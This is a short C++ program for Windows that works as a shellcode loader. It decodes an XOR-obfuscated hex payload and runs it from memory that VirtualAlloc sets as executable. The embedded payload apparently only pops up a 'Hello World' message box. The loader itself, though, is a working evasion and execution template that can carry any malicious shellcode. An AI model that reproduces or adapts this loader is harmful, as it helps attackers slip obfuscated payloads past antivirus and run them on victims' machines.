#include <Windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <iomanip>

// Function to convert a hex string to binary data
std::vector<unsigned char> hex_string_to_binary(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        char byte = static_cast<char>(strtol(byteString.c_str(), nullptr, 16));
        bytes.push_back(byte);
    }
    return bytes;
}

// Function to perform XOR encryption/decryption
void xor_encrypt_decrypt(std::vector<unsigned char>& data, unsigned char key) {
    for (auto& byte : data) {
        byte ^= key;
    }
}

int main() {
    // Example shellcode as a hex string
    std::string shellcode_hex = "e2294682e2294e5ae227bfccaaaaaae227a7f8aaaaaa4234aaaaaae62152e227a7f7aaaaaa557ae227bff5aaaaaae227a7e7aaaaaa42d5aaaaaae79963e627afcbaaaaaae227bfe4aaaaaae29963557ae227bffcaaaaaae227a7a0aaaaaa42fcaaaaaae29963557ae1eff8e4efe6999884eee6e6aae6c5cbcee6c3c8d8cbd8d3ebaafff9eff8999884eee6e6aae7cfd9d9cbcdcfe8c5d2ebaae2cfc6c6c58addc5d8c6ceaae7cfd9d9cbcdcfaaefd2c3defad8c5c9cfd9d9aae2294682cfe621ae8fcaaaaaaae721eab2e727cabae721ae8e56e321d2cae2215b062e6ade8c208d2a56cbd6a92a468a904adfa2e2556de2556d414fe721aae7916edf7ce2996a430daaaaaae321f29aee21e196e6a961e32b6b22aaaaaaef2183e72f47dfa2e2996a432faaaaaae427ae81ef21dbaee7a95feb21e2b2ef21fa8ae6a9795563e727a620eb2193e2a951e221580cdfa220ac2e6adea3415f484ce2996a41e4ef21e28ee6a961cceb21a6e3ef21e2b6e6a961eb21ae23e3916fd685e3916cd980e2279eb2e227d68e9ae6214d0e2a9484df500e6dadeee6e6aae32166eb557de32166e2217c43be555555e2a969e2296e8269"; // Truncated for brevity

    // Convert the hex string to binary data
    std::vector<unsigned char> shellcode = hex_string_to_binary(shellcode_hex);

    // Encryption key
    unsigned char key = '\xAA';

    // Decrypt the shellcode
    xor_encrypt_decrypt(shellcode, key);

    
    // Allocate memory for the shellcode
    void *exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        std::cerr << "VirtualAlloc failed" << std::endl;
        return 1;
    }

    // Copy the shellcode to the allocated memory
    memcpy(exec, shellcode.data(), shellcode.size());

    // Execute the shellcode
    reinterpret_cast<void(*)()>(exec)();

    // Free the allocated memory after use
    VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}